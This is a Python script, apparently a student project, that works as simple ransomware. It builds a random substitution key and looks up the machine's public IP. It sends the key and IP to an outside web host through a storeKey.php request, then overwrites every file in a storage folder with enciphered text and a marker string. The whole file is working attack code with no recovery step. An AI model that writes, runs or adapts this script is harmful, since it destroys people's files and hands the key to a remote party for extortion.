import sys
import random as rd
import requests
from os import path
from os import listdir
from os.path import isfile, join

#Desktop path
targetDir = "/storage/emulated/0/AppProjects/Python3/FYP/Encrypted_Storage/"


#Key generation
keyRaw = []
keyRaw_digit = []
for i in range(26):
    keyRaw.append(chr(97+i))
for i in range(10):
    keyRaw_digit.append(chr(48+i))
rd.shuffle(keyRaw)
rd.shuffle(keyRaw_digit)

finalKey = ""
    
for i in range(26):
    finalKey += str(keyRaw[i])
for i in range(10):
    finalKey += str(keyRaw_digit[i])  
            
#Use http requests to store key, identity (IP addr)

ipAddr = requests.get("http://checkip.amazonaws.com/")

data = requests.get("http://500iqproject.atwebpages.com/storeKey.php?str=" + finalKey + "&ip=" + ipAddr.text)

#get file list in desktop
targetFList = [f for f in listdir(targetDir) if isfile(join(targetDir, f))]

#encrypt process

def encryptContent():
    if len(targetFList) > 0:
        for i in range(len(targetFList)):
            
            utf = validation(targetDir, targetFList[i])

            if len(utf) == 0:
                print("Unable to encrypt: " + targetFList[i])
                continue
            
            targetFileR = open(targetDir + targetFList[i], "r", encoding = utf)
            
            raw = targetFileR.read()
            
            if "--EiNiCiRiYiPiTiEiD--" in raw:
                print("File is already encrypted: "+ targetFList[i]) 
                continue
           
            raw = list(raw)
			
            if len(raw) == 0:
                print("Nothing encrypted in file: " + targetFList[i])
                continue
            
            finalString = ""
            
            
            for j in range(len(raw)):
                if raw[j] >= 'a' and raw[j] <= 'z':
                    raw[j] = finalKey[ord(raw[j])-97]
                elif raw[j] >= 'A' and raw[j] <= 'Z':
                    raw[j] = finalKey[ord(raw[j])-65].upper()
                elif raw[j] >= '0' and raw[j] <= '9':
                    raw[j] = finalKey[ord(raw[j])-22]
                    
                finalString += raw[j]
                
            #overwrite file here
            targetFileW = open(targetDir + targetFList[i], "w", encoding = utf)
            targetFileW.write(finalString + "--EiNiCiRiYiPiTiEiD--")
            targetFileW.close()
             
            print('Encrypted: ' + targetFList[i] + " | Encoding: " + utf)
    else:
        print("No file exist in the folder")        


def validation(targetDir, targetFList):
            #testing on utf-8
            utf = ""
            try:
                targetFileR = open(targetDir + targetFList, "r", encoding = "utf-8")
                
                targetFileR.read()
                
                utf = "utf-8"
            except:
                pass

            #testing on utf-16
            try:
                targetFileR = open(targetDir + targetFList, "r", encoding = "utf-16")
                
                targetFileR.read()

                utf = "utf-16"
            except:
                pass

            #testing on utf-32
            try:
                targetFileR = open(targetDir + targetFList, "r", encoding = "utf-32")
                
                targetFileR.read()

                utf = "utf-32"
            except:
                pass
            return utf
            
            
encryptContent()
